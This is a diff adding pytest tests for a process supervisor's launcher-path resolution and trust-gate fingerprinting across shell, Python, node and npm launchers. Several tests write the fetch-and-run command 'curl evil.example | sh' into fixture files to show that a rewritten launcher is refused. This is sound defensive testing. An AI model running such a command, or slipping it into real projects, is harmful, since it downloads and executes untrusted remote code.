@@ -13,6 +13,7 @@ property a passing acceptance test would not have noticed.
 
 from __future__ import annotations
 
+import json
 import os
 import socket
 import stat
@@ -34,6 +35,7 @@ from lwsm.supervisor import (
     LauncherUntrusted,
     PortAlreadyBound,
     Supervisor,
+    _launcher_path,
     build_child_env,
     launcher_fingerprint,
     validate_launcher,
@@ -656,3 +658,188 @@ def _reap(popen: subprocess.Popen) -> None:
         popen.wait(timeout=5)
     except (subprocess.TimeoutExpired, ChildProcessError):
         pass
+
+
+# --------------------------------------------------------------------------
+# LWSM-1132 / LWSM-1140 — which file a launcher argv actually runs
+# --------------------------------------------------------------------------
+
+
+LAUNCHER_KINDS = ("shell", "python", "node", "npm")
+
+
+@pytest.fixture
+def launcher_factory(project: Path, tmp_path: Path, monkeypatch):
+    """Build a launcher of any of the four shapes `scanner.py` emits.
+
+    The shapes are that module's, verbatim: `("./start.sh",)` at `:981`,
+    `("npm", "run", <script>)` at `:1086`, and `(<interpreter>, <file>)` at
+    `:1144` for `python3` and `node`.
+
+    One fixture per member of the set, because every other `start()` test in
+    this file used `("./start.sh",)` — so the one launcher kind that worked was
+    the only one covered, and three that could not start at all survived 494
+    green tests (LWSM-1132).
+
+    The `npm` case uses a stand-in on `PATH` rather than the real one: the
+    behaviour under test is this supervisor's refusal path, not npm's, and a
+    real `npm run` would make the test slow and dependent on a node toolchain.
+    """
+
+    def build(kind: str) -> tuple[str, ...]:
+        if kind == "shell":
+            write_launcher(project, "exec sleep 30\n")
+            return ("./start.sh",)
+        if kind == "python":
+            (project / "serve.py").write_text(
+                "import time\n\ntime.sleep(30)\n", encoding="utf-8"
+            )
+            return ("python3", "serve.py")
+        if kind == "node":
+            (project / "serve.mjs").write_text(
+                "setTimeout(() => {}, 30000);\n", encoding="utf-8"
+            )
+            return ("node", "serve.mjs")
+        if kind == "npm":
+            (project / "package.json").write_text(
+                json.dumps({"scripts": {"dev": "sleep 30"}}), encoding="utf-8"
+            )
+            fake_bin = tmp_path / "bin"
+            fake_bin.mkdir(exist_ok=True)
+            npm = fake_bin / "npm"
+            npm.write_text("#!/bin/sh\nexec sleep 30\n", encoding="utf-8")
+            npm.chmod(0o700)
+            monkeypatch.setenv("PATH", f"{fake_bin}{os.pathsep}{os.environ['PATH']}")
+            return ("npm", "run", "dev")
+        raise AssertionError(f"unknown launcher kind {kind!r}")
+
+    return build
+
+
+@pytest.mark.parametrize("kind", LAUNCHER_KINDS)
+def test_every_launcher_kind_the_scanner_emits_can_start(
+    supervisor, project: Path, launcher_factory, kind: str
+) -> None:
+    """All four kinds, because three of them could not start at all.
+
+    `_launcher_path` built `<project>/npm` for a PATH-resolved command:
+    `.resolve()` is non-strict so the path came back unchanged, it *is* inside
+    the project, and `validate_launcher`'s `os.stat` then raised ENOENT. The
+    user saw `cannot read <project>/npm` — a message blaming their project for
+    a supervisor bug (LWSM-1132).
+    """
+    argv = launcher_factory(kind)
+    supervisor.trust.confirm(project, launcher_fingerprint(project, argv))
+
+    managed = supervisor.start(project, name="demo", argv=list(argv), port=None)
+
+    assert psutil.pid_exists(managed.pid)
+
+
+def test_a_path_resolved_command_names_no_file_inside_the_project(
+    project: Path,
+) -> None:
+    """POSIX `execvp` searches `PATH` for an `argv[0]` containing no `/`, and
+    never the working directory. `<project>/npm` is not a path that means
+    anything, and constructing it is what refused three launcher kinds.
+    """
+    assert _launcher_path(project, ("npm", "run", "dev")) is None
+
+
+@pytest.mark.parametrize(
+    ("argv", "filename"),
+    [(("python3", "serve.py"), "serve.py"), (("node", "serve.mjs"), "serve.mjs")],
+)
+def test_an_interpreter_argv_names_its_script_as_the_launcher(
+    project: Path, argv: tuple[str, ...], filename: str
+) -> None:
+    """`execve` runs `/usr/bin/python3`, but the untrusted content is the script
+    it is handed — so the script is what a confirmation must be bound to, and
+    what `validate_launcher`'s refusals must apply to (LWSM-1140).
+    """
+    (project / filename).write_text("", encoding="utf-8")
+
+    assert _launcher_path(project, argv) == (project / filename).resolve()
+
+
+@pytest.mark.parametrize("argv", [("npm", "run", "dev"), ("npm", "run")])
+def test_npm_never_names_a_launcher_file_whatever_its_argv_length(
+    project: Path, argv: tuple[str, ...]
+) -> None:
+    """npm's arguments are subcommands, and `run` is not a filename.
+
+    Found by diffing the classifier's verdicts old against new rather than by a
+    test: a *two*-element `npm run` matches the interpreter shape on length
+    alone, so a project holding a file called `run` would have had the trust
+    gate vouching for a file that has nothing to do with what executes.
+    """
+    (project / "run").write_text("", encoding="utf-8")
+
+    assert _launcher_path(project, argv) is None
+
+
+def test_a_relative_launcher_still_resolves_inside_the_project(project: Path) -> None:
+    """The one kind that already worked, pinned so the fix cannot regress it."""
+    assert _launcher_path(project, ("./start.sh",)) == (project / "start.sh").resolve()
+
+
+def test_an_interpreter_script_outside_the_project_is_not_a_launcher(
+    project: Path,
+) -> None:
+    """Containment is the same rule for `argv[1]` as for `argv[0]`."""
+    assert _launcher_path(project, ("python3", "../escape.py")) is None
+
+
+def test_rewriting_an_npm_script_re_arms_the_trust_gate(project: Path) -> None:
+    """ADR-0003 § Trust re-arms the gate "whenever the launcher command or its
+    content hash changes". For `npm run dev` that content is the `scripts.dev`
+    *string*, which npm hands to `/bin/sh` and which a compromised transitive
+    dependency's `postinstall` can rewrite. The fingerprint covered no content
+    at all for this kind — it hashed the argv and a `\\0nofile\\0` marker
+    (LWSM-1140).
+    """
+    package = project / "package.json"
+    argv = ("npm", "run", "dev")
+    package.write_text(json.dumps({"scripts": {"dev": "vite"}}), encoding="utf-8")
+    before = launcher_fingerprint(project, argv)
+
+    package.write_text(
+        json.dumps({"scripts": {"dev": "curl evil.example | sh"}}), encoding="utf-8"
+    )
+
+    assert launcher_fingerprint(project, argv) != before
+
+
+def test_a_rewritten_npm_script_is_refused_after_confirmation(
+    supervisor, project: Path
+) -> None:
+    """The end-to-end half: confirming `npm run dev` must not carry over to
+    whatever `scripts.dev` is rewritten to say.
+    """
+    package = project / "package.json"
+    argv = ["npm", "run", "dev"]
+    package.write_text(json.dumps({"scripts": {"dev": "sleep 30"}}), encoding="utf-8")
+    supervisor.trust.confirm(project, launcher_fingerprint(project, tuple(argv)))
+
+    package.write_text(
+        json.dumps({"scripts": {"dev": "curl evil.example | sh"}}), encoding="utf-8"
+    )
+
+    with pytest.raises(LauncherUntrusted):
+        supervisor.start(project, name="demo", argv=argv, port=None)
+
+
+def test_rewriting_an_interpreter_script_re_arms_the_trust_gate(project: Path) -> None:
+    """The same property for `python3 serve.py`, where the content is the script
+    rather than a string inside a manifest.
+    """
+    script = project / "serve.py"
+    argv = ("python3", "serve.py")
+    script.write_text("print('hello')\n", encoding="utf-8")
+    before = launcher_fingerprint(project, argv)
+
+    script.write_text(
+        "import os\n\nos.system('curl evil.example | sh')\n", encoding="utf-8"
+    )
+
+    assert launcher_fingerprint(project, argv) != before
